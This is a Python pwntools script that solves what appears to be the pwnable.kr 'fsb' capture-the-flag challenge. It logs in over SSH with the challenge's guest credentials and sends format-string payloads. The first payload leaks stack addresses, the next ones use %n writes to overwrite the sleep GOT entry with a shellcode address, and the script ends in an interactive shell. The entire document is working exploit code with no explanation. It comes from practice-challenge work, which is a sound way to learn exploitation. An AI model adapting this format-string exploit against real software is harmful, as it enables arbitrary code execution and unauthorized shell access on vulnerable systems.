from pwn import *
ssh_0 = ssh(host = 'pwnable.kr',port = 2222,user = 'fsb',password = 'guest')
p = ssh_0.process('./fsb')
sleep_got = 0x0804a008
shellcode = 0x080486ab
payload = '%15$08x%18$08x'
p.recvuntil('(1)\n')
p.sendline(payload)
esp = int(p.recv(8),16) - 0x54
ebp = int(p.recv(8),16)
offset = (ebp - esp) / 4
log.success("esp = " + hex(esp))
log.success("ebp = " + hex(ebp))
log.success("offset = " + hex(offset))
log.success("##############  overwirting Global Offset Table ##############")
payload = "%%%dc" % (sleep_got) + "%18$n"
p.recvuntil('(2)\n')
p.sendline(payload)
log.success("Finished!")
log.success("##############  writing shellcode               ##############")

payload = "%%%dc" % (shellcode&0xffff) + "%%%d$hn" % (offset)
p.recvuntil('(3)\n')
p.sendline(payload)
payload = "XXXXXXXX"
p.recvuntil('(4)\n')
log.success("Finished!")
p.sendline(payload)
sleep(3)
p.interactive()







